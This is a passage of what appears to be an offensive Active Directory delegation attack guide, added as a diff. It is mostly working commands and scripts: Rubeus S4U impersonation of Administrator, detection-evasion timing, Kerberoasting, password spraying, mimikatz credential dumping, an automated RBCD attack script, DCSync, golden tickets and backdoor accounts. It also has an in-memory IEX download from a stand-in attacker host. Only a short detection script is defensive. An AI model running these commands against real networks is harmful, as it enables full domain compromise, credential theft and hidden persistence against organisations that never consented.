+# Step 2: On Service B, use ticket to access C
+# (Requires access to Service B or compromising it)
+.\Rubeus.exe s4u /user:svc_B /impersonateuser:Administrator /msdsspn:CIFS/serviceC.corp.local /ticket:TICKET_FROM_A /nowrap /ptt
+```
+
+#### S4U2Self for Ticket Renewal
+
+**Refreshing Expired Tickets:**
+```powershell
+# If service account has protocol transition
+# Can create new forwardable tickets for users
+
+# Original ticket expired
+# Request new one via S4U2Self
+.\Rubeus.exe s4u /user:svc_web /impersonateuser:Administrator /self /ticket:SERVICE_TGT /nowrap
+
+# Get fresh forwardable ticket
+# Continue operations
+```
+
+#### Targeting Specific Users
+
+**Impersonating Service Accounts:**
+```powershell
+# Target other service accounts for lateral movement
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} | Select samaccountname
+
+# Impersonate high-privilege service account
+.\Rubeus.exe s4u /user:svc_web /impersonateuser:svc_backup /msdsspn:CIFS/fileserver.corp.local /ticket:TGT /nowrap /ptt
+
+# Access resources as backup service (may have broad access)
+```
+
+#### S4U with Computer Accounts
+
+**Using Computer Account Credentials:**
+```powershell
+# Extract computer account hash
+mimikatz # lsadump::sam
+
+# Use computer account for S4U
+.\Rubeus.exe asktgt /user:WEBSERVER$ /rc4:HASH /domain:corp.local /nowrap
+
+# Computer account with delegation can impersonate users
+.\Rubeus.exe s4u /user:WEBSERVER$ /impersonateuser:Administrator /msdsspn:CIFS/fileserver.corp.local /ticket:TGT /nowrap /ptt
+```
+
+### S4U Detection Evasion
+
+#### Minimizing Indicators
+
+**Careful User Selection:**
+```powershell
+# Avoid impersonating:
+# - krbtgt
+# - Disabled accounts
+# - Accounts that never log in
+# - Protected Users group members
+
+# Instead impersonate:
+# - Active service accounts
+# - Regularly used admin accounts
+# - Accounts appropriate for the service context
+```
+
+**Timing Attacks:**
+```powershell
+# Perform S4U during business hours
+# Match normal service behavior
+$hour = (Get-Date).Hour
+if($hour -ge 9 -and $hour -le 17) {
+    # Perform S4U attack
+    .\Rubeus.exe s4u /user:svc_web /impersonateuser:admin /msdsspn:HTTP/backend /ticket:TGT /ptt
+}
+```
+
+#### Ticket Lifetime Management
+
+**Short-Lived Tickets:**
+```powershell
+# Request tickets, use immediately, let expire
+.\Rubeus.exe s4u /user:svc_web /impersonateuser:admin /msdsspn:CIFS/target /ticket:TGT /ptt
+
+# Perform actions quickly
+dir \\target\c$
+copy tools.exe \\target\c$\temp\
+
+# Ticket expires naturally (10 hours)
+# Less suspicious than long-term persistence
+```
+
+### S4U Limitations and Restrictions
+
+**Technical Limitations:**
+- Requires compromised service account with delegation rights
+- Cannot impersonate Protected Users group members
+- Cannot impersonate accounts marked "sensitive and cannot be delegated"
+- Tickets still expire (renewal possible with S4U2Self)
+- KDC may enforce additional restrictions
+
+**Configuration Requirements:**
+```
+S4U2Self:
+- TrustedToAuthForDelegation flag (for forwardable tickets)
+- Service account must be able to authenticate
+
+S4U2Proxy:
+- msDS-AllowedToDelegateTo configured (constrained)
+  OR
+- msDS-AllowedToActOnBehalfOfOtherIdentity configured (RBCD)
+- Requires forwardable ticket
+```
+
+**Protected Accounts:**
+```powershell
+# These cannot be impersonated via S4U:
+
+# Protected Users group
+Get-ADGroupMember "Protected Users"
+
+# Accounts with "sensitive" flag
+Get-ADUser -Filter {AccountNotDelegated -eq $true}
+
+# Attempting to impersonate results in error
+.\Rubeus.exe s4u /user:svc_web /impersonateuser:ProtectedAdmin /msdsspn:CIFS/target /ticket:TGT
+
+# Error: KDC_ERR_POLICY
+```
+
+---
+
+## 7. Reconnaissance and Preparation
+
+### Comprehensive Enumeration
+
+#### Domain-Wide Delegation Discovery
+
+**Using PowerView:**
+```powershell
+# Import PowerView
+Import-Module .\PowerView.ps1
+
+# Find ALL delegation configurations
+Get-DomainComputer -Unconstrained
+Get-DomainComputer -TrustedToAuth
+Get-DomainUser -TrustedToAuth
+Get-DomainUser -AllowDelegation
+
+# Detailed output with all properties
+Get-DomainComputer | Where-Object {
+    ($_.useraccountcontrol -band 524288) -or # Unconstrained
+    ($_.useraccountcontrol -band 16777216) -or # Protocol Transition
+    ($_.'msds-allowedtodelegateto') -or # Constrained
+    ($_.'msds-allowedtoactonbehalfofotheridentity') # RBCD
+} | Select-Object name, useraccountcontrol, msds-allowedtodelegateto, msds-allowedtoactonbehalfofotheridentity
+```
+
+**Using BloodHound:**
+```cypher
+// Find all computers with unconstrained delegation
+MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
+
+// Find all users/computers with constrained delegation
+MATCH (n) WHERE n.allowedtodelegate IS NOT NULL RETURN n
+
+// Find shortest path using delegation
+MATCH p=shortestPath((u:User)-[*1..]->(c:Computer))
+WHERE ANY(rel IN relationships(p) WHERE type(rel) = "AllowedToDelegate")
+RETURN p
+
+// Find computers where user has write access (for RBCD)
+MATCH (u:User {name:"USER@DOMAIN.COM"})-[r:GenericAll|GenericWrite|WriteProperty]->(c:Computer)
+RETURN c.name
+```
+
+**Using ADModule:**
+```powershell
+# Unconstrained delegation
+Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation, ServicePrincipalName | Format-Table Name, TrustedForDelegation -AutoSize
+
+Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
+
+# Constrained delegation
+Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo, TrustedToAuthForDelegation | Format-Table Name, msDS-AllowedToDelegateTo, TrustedToAuthForDelegation -AutoSize
+
+# RBCD
+Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | Where-Object {$_.'msDS-AllowedToActOnBehalfOfOtherIdentity' -ne $null}
+```
+
+#### Analyzing Delegation Configurations
+
+**Parse Delegation Targets:**
+```powershell
+# Get all constrained delegation configurations
+$delegations = Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo, TrustedToAuthForDelegation
+
+foreach($obj in $delegations) {
+    Write-Host "`n[+] $($obj.Name)"
+    Write-Host "    Protocol Transition: $($obj.TrustedToAuthForDelegation)"
+    Write-Host "    Allowed SPNs:"
+    foreach($spn in $obj.'msDS-AllowedToDelegateTo') {
+        Write-Host "        - $spn"
+        
+        # Parse SPN for alternative service attacks
+        $service = $spn.Split('/')[0]
+        $host = $spn.Split('/')[1]
+        
+        Write-Host "          Alternative services on $host"
+        Write-Host "          - CIFS/$host (file shares)"
+        Write-Host "          - HTTP/$host (web services)"
+        Write-Host "          - HOST/$host (WinRM, tasks)"
+        Write-Host "          - LDAP/$host (if DC)"
+    }
+}
+```
+
+**Identify High-Value Targets:**
+```powershell
+# Services that can delegate to Domain Controllers
+Get-ADObject -Filter {msDS-AllowedToDelegateTo -like "*DC*"} -Properties msDS-AllowedToDelegateTo | Select-Object Name, msDS-AllowedToDelegateTo
+
+# Services that can delegate to SQL servers
+Get-ADObject -Filter {msDS-AllowedToDelegateTo -like "*SQL*"} -Properties msDS-AllowedToDelegateTo
+
+# Services with protocol transition (highest risk)
+Get-ADObject -Filter {TrustedToAuthForDelegation -eq $true} -Properties msDS-AllowedToDelegateTo, TrustedToAuthForDelegation
+```
+
+#### Mapping Attack Paths
+
+**BloodHound Queries for Delegation Paths:**
+```cypher
+// Shortest path to DA using delegation
+MATCH p=shortestPath((u:User {name:"CURRENTUSER@DOMAIN.COM"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.COM"}))
+WHERE ANY(rel IN relationships(p) WHERE type(rel) IN ["AllowedToDelegate","AllowedToAct"])
+RETURN p
+
+// Find computers you can configure RBCD on
+MATCH (u:User {name:"CURRENTUSER@DOMAIN.COM"})-[r:GenericAll|GenericWrite|WriteProperty]->(c:Computer)
+RETURN c.name, c.operatingsystem
+
+// Find delegation chains
+MATCH (a)-[r1:AllowedToDelegate]->(b)-[r2:AllowedToDelegate]->(c)
+RETURN a.name, b.name, c.name
+```
+
+**Custom Enumeration Script:**
+```powershell
+# Comprehensive delegation enumeration
+$results = @()
+
+# Unconstrained
+$unconstrained = Get-ADComputer -Filter {TrustedForDelegation -eq $true}
+foreach($comp in $unconstrained) {
+    $results += [PSCustomObject]@{
+        Name = $comp.Name
+        Type = "Unconstrained"
+        Target = "ANY"
+        ProtocolTransition = "N/A"
+        Risk = "CRITICAL"
+    }
+}
+
+# Constrained
+$constrained = Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo, TrustedToAuthForDelegation
+foreach($obj in $constrained) {
+    foreach($spn in $obj.'msDS-AllowedToDelegateTo') {
+        $results += [PSCustomObject]@{
+            Name = $obj.Name
+            Type = "Constrained"
+            Target = $spn
+            ProtocolTransition = $obj.TrustedToAuthForDelegation
+            Risk = if($obj.TrustedToAuthForDelegation) {"HIGH"} else {"MEDIUM"}
+        }
+    }
+}
+
+# RBCD
+$rbcd = Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | Where-Object {$_.'msDS-AllowedToActOnBehalfOfOtherIdentity' -ne $null}
+foreach($comp in $rbcd) {
+    $results += [PSCustomObject]@{
+        Name = $comp.Name
+        Type = "RBCD"
+        Target = "Configured"
+        ProtocolTransition = "Yes"
+        Risk = "HIGH"
+    }
+}
+
+$results | Export-Csv delegation_audit.csv -NoTypeInformation
+$results | Out-GridView
+```
+
+### Target Prioritization
+
+#### Risk Assessment Matrix
+
+**Unconstrained Delegation:**
+```
+Risk: CRITICAL
+Priority: 1
+Reason: Can capture ANY user's TGT, including Domain Admins
+Attack Complexity: Low
+Required Access: Admin on delegation server
+Impact: Complete domain compromise possible
+```
+
+**Constrained Delegation with Protocol Transition:**
+```
+Risk: HIGH
+Priority: 2
+Reason: Can impersonate any user without their authentication
+Attack Complexity: Medium
+Required Access: Service account compromise
+Impact: Access to configured services + alternatives
+```
+
+**Constrained Delegation (Kerberos Only):**
+```
+Risk: MEDIUM
+Priority: 3
+Reason: Requires user to authenticate with Kerberos
+Attack Complexity: Medium
+Required Access: Service account compromise
+Impact: Access to configured services + alternatives
+```
+
+**RBCD:**
+```
+Risk: HIGH
+Priority: 2
+Reason: Self-service delegation configuration
+Attack Complexity: Medium
+Required Access: GenericWrite on target computer
+Impact: Full access to target computer as any user
+```
+
+#### Exploitation Difficulty Assessment
+
+**Easy Targets:**
+```powershell
+# Unconstrained delegation with public-facing service
+Get-DomainComputer -Unconstrained | Where-Object {
+    $_.ServicePrincipalName -like "*HTTP*"
+}
+
+# Constrained delegation with weak service account
+Get-DomainUser -TrustedToAuth | Where-Object {
+    $_.ServicePrincipalName -ne $null # Kerberoastable
+}
+
+# RBCD opportunities with Domain Users write access
+Get-DomainObjectAcl | Where-Object {
+    $_.SecurityIdentifier -match ".*-513$" -and # Domain Users
+    $_.ActiveDirectoryRights -match "GenericWrite|GenericAll"
+}
+```
+
+**High-Value Targets:**
+```powershell
+# Delegation to Domain Controllers
+Get-ADObject -Filter {msDS-AllowedToDelegateTo -like "*ldap*dc*"}
+
+# Delegation to SQL servers with sensitive data
+Get-ADObject -Filter {msDS-AllowedToDelegateTo -like "*mssql*"}
+
+# Unconstrained delegation on file servers
+Get-DomainComputer -Unconstrained | Where-Object {
+    $_.ServicePrincipalName -like "*CIFS*"
+}
+```
+
+### Credential Acquisition Strategy
+
+#### Service Account Compromise Methods
+
+**Method 1: Kerberoasting:**
+```powershell
+# Enumerate kerberoastable accounts with delegation
+Get-DomainUser -SPN | Where-Object {
+    ($_.TrustedToAuthForDelegation -eq $true) -or
+    ($_.'msDS-AllowedToDelegateTo')
+}
+
+# Request service tickets
+.\Rubeus.exe kerberoast /user:svc_web /nowrap
+
+# Crack offline
+hashcat -m 13100 hash.txt rockyou.txt
+```
+
+**Method 2: AS-REP Roasting:**
+```powershell
+# Find accounts without pre-auth and delegation
+Get-DomainUser -PreauthNotRequired | Where-Object {
+    ($_.'msDS-AllowedToDelegateTo') -or
+    ($_.TrustedToAuthForDelegation -eq $true)
+}
+
+# Request AS-REP
+.\Rubeus.exe asreproast /user:svc_nopre /nowrap
+
+# Crack
+hashcat -m 18200 hash.txt rockyou.txt
+```
+
+**Method 3: Password Spraying:**
+```powershell
+# Target service accounts with common passwords
+$services = Get-DomainUser -TrustedToAuth
+$passwords = @("Password1","Spring2024","ServicePass123")
+
+foreach($svc in $services) {
+    foreach($pass in $passwords) {
+        # Test authentication
+        $result = Test-ADAuthentication -Username $svc.samaccountname -Password $pass
+        if($result) {
+            Write-Host "[+] $($svc.samaccountname):$pass"
+        }
+    }
+}
+```
+
+**Method 4: Credential Harvesting:**
+```cmd
+# If service account logged into compromised system
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+
+# Look for delegation-enabled accounts
+mimikatz # !processprotect /process:lsass.exe /remove
+mimikatz # sekurlsa::tickets /export
+```
+
+#### Computer Account Acquisition
+
+**Method 1: Local Admin Access:**
+```cmd
+# If local admin on computer with delegation
+mimikatz # lsadump::sam
+
+# Extract computer account hash
+# COMPUTERNAME$:NTLM_HASH
+```
+
+**Method 2: Create Computer Account:**
+```powershell
+# Check MachineAccountQuota
+(Get-ADDomain).DistinguishedName | ForEach-Object {
+    (Get-ADObject $_ -Properties ms-DS-MachineAccountQuota).'ms-DS-MachineAccountQuota'
+}
+
+# If > 0, create computer
+New-MachineAccount -MachineAccount "ATTACKER-PC" -Password $(ConvertTo-SecureString 'Pass123!' -AsPlainText -Force)
+```
+
+**Method 3: Takeover Stale Computers:**
+```powershell
+# Find old/disabled computers with delegation
+Get-ADComputer -Filter {
+    (Enabled -eq $false) -and
+    (msDS-AllowedToDelegateTo -ne $null)
+} -Properties msDS-AllowedToDelegateTo, LastLogonDate
+
+# If you have write access, reset password
+Set-ADAccountPassword -Identity "OLD-DELEGATED-PC$" -Reset
+```
+
+### Tool Preparation
+
+#### Essential Tools
+
+**Windows:**
+```
+- Rubeus.exe (ticket operations)
+- PowerView.ps1 (enumeration)
+- Mimikatz.exe (credential extraction)
+- PowerMad.ps1 (computer account creation)
+- ADModule (native enumeration)
+```
+
+**Linux:**
+```
+- Impacket suite (getST.py, addcomputer.py, etc.)
+- BloodHound (attack path analysis)
+- CrackMapExec (credential testing)
+- Evil-WinRM (remote access)
+```
+
+#### Environment Setup
+
+**Kali Linux:**
+```bash
+# Install Impacket
+pip install impacket
+
+# Install BloodHound
+apt install bloodhound
+
+# Install CrackMapExec
+apt install crackmapexec/netexec
+cme
+
+# Verify tools
+getST.py -h
+addcomputer.py -h
+rbcd.py -h
+```
+
+**Windows Attack Machine:**
+```powershell
+# Download Rubeus
+wget https://github.com/GhostPack/Rubeus/releases/latest -OutFile Rubeus.exe
+
+# Download PowerView
+wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
+
+# Download PowerMad
+wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1
+
+# Load in memory
+IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerView.ps1')
+```
+
+---
+
+## 8. Attack Execution and Tooling
+
+### Rubeus Complete Reference
+
+#### Basic Ticket Operations
+
+**Request TGT:**
+```powershell
+# With password
+.\Rubeus.exe asktgt /user:svc_web /password:Password123! /domain:corp.local /nowrap
+
+# With RC4 hash
+.\Rubeus.exe asktgt /user:svc_web /rc4:NTLM_HASH /domain:corp.local /nowrap
+
+# With AES256 key
+.\Rubeus.exe asktgt /user:svc_web /aes256:AES_KEY /domain:corp.local /nowrap
+
+# For computer account
+.\Rubeus.exe asktgt /user:COMPUTER$ /rc4:HASH /domain:corp.local /nowrap
+```
+
+#### S4U Operations
+
+**S4U2Self (Get forwardable ticket):**
+```powershell
+# Basic S4U2Self
+.\Rubeus.exe s4u /user:svc_web /impersonateuser:Administrator /self /ticket:BASE64_TGT /nowrap
+
+# With specific domain
+.\Rubeus.exe s4u /user:svc_web /impersonateuser:Administrator /self /domain:corp.local /ticket:BASE64_TGT /nowrap
+
+# Output as file
+.\Rubeus.exe s4u /user:svc_web /impersonateuser:Administrator /self /ticket:BASE64_TGT /outfile:admin_ticket.kirbi
+```
+
+**S4U2Proxy (Get ticket to backend service):**
+```powershell
+# Basic constrained delegation
+.\Rubeus.exe s4u /user:svc_web /impersonateuser:Administrator /msdsspn:MSSQLSvc/sql.corp.local /ticket:BASE64_TGT /nowrap /ptt
+
+# With alternative service
+.\Rubeus.exe s4u /user:svc_web /impersonateuser:Administrator /msdsspn:MSSQLSvc/sql.corp.local /altservice:CIFS /ticket:BASE64_TGT /nowrap /ptt
+
+# Multiple alternative services
+.\Rubeus.exe s4u /user:svc_web /impersonateuser:Administrator /msdsspn:MSSQLSvc/sql.corp.local /altservice:CIFS,HTTP,HOST,LDAP /ticket:BASE64_TGT /nowrap
+```
+
+**Combined S4U2Self + S4U2Proxy:**
+```powershell
+# Full protocol transition attack
+.\Rubeus.exe s4u /user:svc_web /impersonateuser:Administrator /msdsspn:CIFS/fileserver.corp.local /ticket:BASE64_TGT /nowrap /ptt
+
+# Rubeus automatically:
+# 1. Performs S4U2Self to get forwardable ticket
+# 2. Performs S4U2Proxy to get backend service ticket
+# 3. Injects ticket with /ptt
+```
+
+#### Monitoring and Harvesting
+
+**Monitor for tickets (unconstrained delegation):**
+```powershell
+# Monitor for new TGTs
+.\Rubeus.exe monitor /interval:5 /nowrap
+
+# Filter for specific user
+.\Rubeus.exe monitor /interval:1 /filteruser:Administrator /nowrap
+
+# Filter for Domain Admin group members
+.\Rubeus.exe monitor /interval:1 /filteruser:Administrator,DA_User1,DA_User2 /nowrap
+```
+
+**Harvest all tickets:**
+```powershell
+# Dump all tickets from current session
+.\Rubeus.exe dump /nowrap
+
+# Dump only TGTs
+.\Rubeus.exe dump /service:krbtgt /nowrap
+
+# Dump specific user's tickets
+.\Rubeus.exe dump /luid:0x3e7 /nowrap
+
+# Dump and save to file
+.\Rubeus.exe dump /service:krbtgt /nowrap /outfile:tickets.txt
+```
+
+#### Ticket Management
+
+**Pass the Ticket:**
+```powershell
+# Inject ticket from Base64
+.\Rubeus.exe ptt /ticket:BASE64_TICKET
+
+# Inject ticket from file
+.\Rubeus.exe ptt /ticket:ticket.kirbi
+
+# Inject into specific logon session
+.\Rubeus.exe ptt /luid:0x3e7 /ticket:BASE64_TICKET
+```
+
+**Describe ticket:**
+```powershell
+# Parse ticket contents
+.\Rubeus.exe describe /ticket:BASE64_TICKET
+
+# Shows:
+# - Username
+# - Domain
+# - Service
+# - Encryption type
+# - Validity times
+# - Flags
+```
+
+**Renew ticket:**
+```powershell
+# Renew TGT
+.\Rubeus.exe renew /ticket:BASE64_TGT /nowrap
+
+# Auto-renew with monitoring
+.\Rubeus.exe monitor /interval:30 /targetuser:Administrator
+```
+
+### Impacket Complete Reference
+
+#### getST.py (Get Service Ticket)
+
+**Basic Usage:**
+```bash
+# With password
+getST.py -spn CIFS/fileserver.corp.local -impersonate Administrator corporation.local/svc_web:Password123!
+
+# With NTLM hash
+getST.py -spn CIFS/fileserver.corp.local -impersonate Administrator -hashes :NTLM_HASH corporation.local/svc_web
+
+# With AES key
+getST.py -spn CIFS/fileserver.corp.local -impersonate Administrator -aesKey AES256_KEY corporation.local/svc_web
+```
+
+**Alternative Service:**
+```bash
+# Request CIFS instead of configured service
+getST.py -spn MSSQLSvc/sql.corp.local -impersonate Administrator -altservice CIFS corporation.local/svc_web:Password123!
+
+# Multiple alternative services
+getST.py -spn MSSQLSvc/sql.corp.local -impersonate Administrator -altservice CIFS -altservice HTTP -altservice HOST corporation.local/svc_web:Password123!
+```
+
+**Additional Options:**
+```bash
+# Specify DC
+getST.py -spn CIFS/target -impersonate Administrator -dc-ip 10.10.10.10 corp.local/svc_web:Pass123
+
+# Save ticket with custom name
+getST.py -spn CIFS/target -impersonate Administrator corp.local/svc_web:Pass123
+# Output: Administrator.ccache
+
+# Use existing TGT
+getST.py -spn CIFS/target -impersonate Administrator -k -no-pass -dc-ip 10.10.10.10
+```
+
+**Using Generated Tickets:**
+```bash
+# Set environment variable
+export KRB5CCNAME=Administrator.ccache
+
+# Use with Impacket tools
+smbclient.py -k -no-pass Administrator@target.corp.local
+smbexec.py -k -no-pass Administrator@target.corp.local
+psexec.py -k -no-pass Administrator@target.corp.local
+wmiexec.py -k -no-pass Administrator@target.corp.local
+secretsdump.py -k -no-pass Administrator@target.corp.local
+```
+
+#### addcomputer.py (Create Computer Account)
+
+**Create Computer:**
+```bash
+# Basic creation
+addcomputer.py -computer-name 'ATTACKER-PC$' -computer-pass 'Password123!' -dc-ip 10.10.10.10 corporation.local/user:password
+
+# Verify quota first
+addcomputer.py -dc-ip 10.10.10.10 corporation.local/user:password -method LDAP
+
+# Create in specific OU
+addcomputer.py -computer-name 'ATTACKER-PC$' -computer-pass 'Password123!' -ou 'OU=Computers,DC=corp,DC=local' corporation.local/user:password
+```
+
+#### rbcd.py (Configure RBCD)
+
+**Set RBCD:**
+```bash
+# Configure target to trust source
+rbcd.py -delegate-from 'ATTACKER-PC$' -delegate-to 'TARGET$' -action write -dc-ip 10.10.10.10 corporation.local/user:password
+
+# Verify configuration
+rbcd.py -delegate-to 'TARGET$' -action read -dc-ip 10.10.10.10 corporation.local/user:password
+
+# Remove RBCD
+rbcd.py -delegate-from 'ATTACKER-PC$' -delegate-to 'TARGET$' -action remove corporation.local/user:password
+```
+
+**Full RBCD Attack:**
+```bash
+# 1. Create computer account
+addcomputer.py -computer-name 'EVIL-PC$' -computer-pass 'Evil123!' -dc-ip 10.10.10.10 corp.local/user:pass
+
+# 2. Configure RBCD
+rbcd.py -delegate-from 'EVIL-PC$' -delegate-to 'TARGET$' -action write corp.local/user:pass
+
+# 3. Get service ticket
+getST.py -spn CIFS/target.corp.local -impersonate Administrator -dc-ip 10.10.10.10 corp.local/'EVIL-PC$':'Evil123!'
+
+# 4. Use ticket
+export KRB5CCNAME=Administrator.ccache
+smbexec.py -k -no-pass Administrator@target.corp.local
+```
+
+### PowerView Enumeration Scripts
+
+#### Delegation Discovery
+```powershell
+# Comprehensive delegation enumeration
+function Get-DelegationInfo {
+    Write-Host "[*] Enumerating Unconstrained Delegation..."
+    $unconstrained = Get-DomainComputer -Unconstrained | Select name,dnshostname,serviceprincipalname
+    Write-Host "[+] Found $($unconstrained.Count) computers with unconstrained delegation"
+    
+    Write-Host "`n[*] Enumerating Constrained Delegation..."
+    $constrained = Get-DomainObject -LDAPFilter "(msDS-AllowedToDelegateTo=*)" | Select name,msds-allowedtodelegateto,useraccountcontrol
+    Write-Host "[+] Found $($constrained.Count) objects with constrained delegation"
+    
+    Write-Host "`n[*] Enumerating Protocol Transition..."
+    $prototrans = Get-DomainObject -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=16777216)"
+    Write-Host "[+] Found $($prototrans.Count) objects with protocol transition"
+    
+    Write-Host "`n[*] Enumerating RBCD..."
+    $rbcd = Get-DomainComputer | Where-Object {$_.'msds-allowedtoactonbehalfofotheridentity'}
+    Write-Host "[+] Found $($rbcd.Count) computers with RBCD configured"
+    
+    return @{
+        Unconstrained = $unconstrained
+        Constrained = $constrained
+        ProtocolTransition = $prototrans
+        RBCD = $rbcd
+    }
+}
+
+# Run enumeration
+$results = Get-DelegationInfo
+```
+
+#### ACL Analysis for RBCD
+```powershell
+# Find computers writable by current user
+function Find-WritableComputers {
+    $computers = Get-DomainComputer
+    $writable = @()
+    
+    foreach($computer in $computers) {
+        $acl = Get-DomainObjectAcl -Identity $computer.distinguishedname -ResolveGUIDs
+        
+        foreach($ace in $acl) {
+            if(($ace.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteProperty") -and
+               ($ace.SecurityIdentifier -eq $CurrentUserSID)) {
+                $writable += $computer.name
+                break
+            }
+        }
+    }
+    
+    Write-Host "[+] Found $($writable.Count) writable computers"
+    return $writable
+}
+
+# Execute
+$writableComputers = Find-WritableComputers
+```
+
+### Automation Scripts
+
+#### Complete RBCD Attack Script
+```powershell
+# RBCD-Attack.ps1
+param(
+    [string]$Target,
+    [string]$ComputerName = "EVIL-PC",
+    [string]$ComputerPassword = "EvilPass123!",
+    [string]$ImpersonateUser = "Administrator"
+)
+
+# 1. Create computer account
+Write-Host "[*] Creating computer account: $ComputerName"
+New-MachineAccount -MachineAccount $ComputerName -Password $(ConvertTo-SecureString $ComputerPassword -AsPlainText -Force)
+
+# 2. Get computer SID
+$CompSID = (Get-ADComputer $ComputerName).SID
+
+# 3. Configure RBCD
+Write-Host "[*] Configuring RBCD on $Target"
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$CompSID)"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+Get-DomainComputer $Target | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+
+# 4. Request tickets
+Write-Host "[*] Requesting service tickets"
+.\Rubeus.exe asktgt /user:$ComputerName$ /password:$ComputerPassword /domain:$env:USERDNSDOMAIN /nowrap /outfile:tgt.txt
+
+$TGT = Get-Content tgt.txt
+
+.\Rubeus.exe s4u /user:$ComputerName$ /impersonateuser:$ImpersonateUser /msdsspn:CIFS/$Target /altservice:HTTP,HOST,LDAP /ticket:$TGT /nowrap /ptt
+
+Write-Host "[+] Attack complete! Tickets injected."
+Write-Host "[+] Try: dir \\$Target\c$"
+```
+
+#### Delegation Abuse Detection Script
+```powershell
+# Detect-DelegationAbuse.ps1
+
+# Monitor for S4U requests
+$events = Get-WinEvent -FilterHashtable @{
+    LogName='Security'
+    ID=4769
+    StartTime=(Get-Date).AddHours(-24)
+}
+
+$suspicious = $events | Where-Object {
+    $_.Properties[2].Value -match "S4U"  # S4U2Self or S4U2Proxy
+}
+
+if($suspicious) {
+    Write-Warning "[!] Detected $($suspicious.Count) S4U requests in last 24 hours"
+    $suspicious | Select TimeCreated, @{N='User';E={$_.Properties[0].Value}}, @{N='Service';E={$_.Properties[1].Value}}
+}
+```
+
+---
+
+## 9. Advanced Scenarios and Persistence
+
+### Advanced Attack Scenarios
+
+#### Scenario 1: Complete Domain Compromise via Unconstrained Delegation
+
+**Objective:** Escalate from standard user to Domain Admin using unconstrained delegation.
+
+**Environment:**
+- Initial access: Standard domain user account
+- Target: Web server (WEBSERVER) with unconstrained delegation
+- Final goal: Domain Admin access
+
+**Attack Chain:**
+```
+1. Discover unconstrained delegation servers
+2. Find vulnerability on WEBSERVER (or compromise service account)
+3. Gain local admin on WEBSERVER
+4. Coerce Domain Controller authentication
+5. Extract DC computer account TGT
+6. Perform DCSync
+7. Create Golden Ticket
+8. Complete domain control
+```
+
+**Detailed Execution:**
+
+**Step 1: Initial Reconnaissance**
+```powershell
+# From standard user account
+Import-Module .\PowerView.ps1
+
+# Find unconstrained delegation servers
+Get-DomainComputer -Unconstrained | Select name,dnshostname,operatingsystem
+
+# Output:
+# WEBSERVER.corp.local - Windows Server 2019
+# DC01.corp.local - Windows Server 2019 (expected)
+
+# Check for vulnerabilities or service accounts
+Get-DomainUser -SPN | Where-Object {$_.ServicePrincipalName -like "*WEBSERVER*"}
+```
+
+**Step 2: Compromise WEBSERVER**
+```powershell
+# Method A: Kerberoast service account on WEBSERVER
+.\Rubeus.exe kerberoast /user:svc_iis /nowrap
+# Crack hash offline
+
+# Method B: Exploit vulnerability on web application
+# Use CVE or misconfig to get code execution
+
+# Result: Local admin on WEBSERVER
+```
+
+**Step 3: Setup Monitoring**
+```powershell
+# On WEBSERVER with admin access
+# Start monitoring for high-value TGTs
+.\Rubeus.exe monitor /interval:1 /filteruser:DC01$ /nowrap > C:\temp\capture.txt
+```
+
+**Step 4: Coerce DC Authentication**
+```cmd
+# From attacking machine
+# Use SpoolSample to force DC to authenticate
+SpoolSample.exe DC01.corp.local WEBSERVER.corp.local
+
+# Or use PetitPotam
+PetitPotam.py WEBSERVER.corp.local DC01.corp.local
+```
+
+**Step 5: Extract DC TGT**
+```powershell
+# On WEBSERVER, Rubeus captured:
+# [0;3e7]-2-0-40e10000-DC01$@krbtgt-CORP.LOCAL.kirbi
+
+# Copy the Base64 ticket
+.\Rubeus.exe ptt /ticket:BASE64_DC_TGT
+
+# Verify
+klist
+# Should show DC01$ ticket
+```
+
+**Step 6: DCSync**
+```cmd
+# With DC computer account TGT
+mimikatz # lsadump::dcsync /domain:corp.local /all /csv > C:\temp\hashes.txt
+
+# Extract krbtgt hash specifically
+mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
+
+# Note krbtgt NTLM hash and AES keys
+```
+
+**Step 7: Create Golden Ticket**
+```cmd
+# Using extracted krbtgt hash
+mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-DOMAIN-SID /krbtgt:KRBTGT_HASH /user:Administrator /id:500 /groups:512,513,518,519,520 /ptt
+
+# Verify
+klist
+
+# Test domain admin access
+dir \\DC01\C$
+dir \\DC01\SYSVOL
+```
+
+**Step 8: Establish Persistence**
+```cmd
+# Create additional Golden Tickets for backup
+mimikatz # kerberos::golden /domain:corp.local /sid:DOMAIN_SID /krbtgt:HASH /user:BackupAdmin /ticket:backup.kirbi
+
+# Create Silver Tickets for key services
+mimikatz # kerberos::golden /domain:corp.local /sid:DOMAIN_SID /target:dc01.corp.local /service:LDAP /rc4:DC01_HASH /user:Administrator /ptt
+
+# Dump all credentials for offline access
+mimikatz # lsadump::dcsync /domain:corp.local /all /csv > all_hashes.csv
+```
+
+**Post-Exploitation:**
+```powershell
+# Create backdoor accounts
+New-ADUser -Name "Support Account" -SamAccountName "support_svc" -AccountPassword (ConvertTo-SecureString "ComplexP@ss123!" -AsPlainText -Force) -Enabled $true
